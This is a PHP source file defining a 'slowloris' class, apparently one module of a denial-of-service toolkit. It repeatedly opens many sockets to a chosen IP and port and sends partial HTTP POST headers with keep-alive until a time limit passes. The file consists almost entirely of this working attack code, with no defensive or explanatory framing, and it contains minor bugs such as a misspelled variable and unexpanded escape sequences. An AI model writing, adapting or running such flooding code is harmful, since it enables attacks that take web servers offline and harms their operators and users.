<?php
class slowloris{
	
	
	function slowloris($ip, $port, $timedout, $starttime, $socketn, $max_time, $exec_time){						//SLOWLORIS
		$lenght=42;
			while(1){
				try{ 
					if(time() > $max_time){
						output($packets, $starttime, $exec_time, $lenght);
						break; 
					}
				
					for($i=0;$i<=$socketn;$i++){
						$fp[$i]=fsockopen("$ip",$port,$errno,$errstr,$timedout);
						$out="POST / HTTP/1.1\r\n";
						$out.="Host: ".$ip."\r\n";
						$out.='Content-Type: application/x-www-form-urlencoded\r\n';
						$out.="Content-length: ".$lenght."\r\n";
						$out.= "Connection: keep-alive\r\n";
						$out.= "\r\n";
						$packets++; 
						fwrite($fp[$i],$out);
				}
				for($j=0;$j<=$socketn;$j++){
					
					fclose($fp[$j]);
				}
				}catch (Exception $e){
				echo $e;
				}
			}


	}
}

?>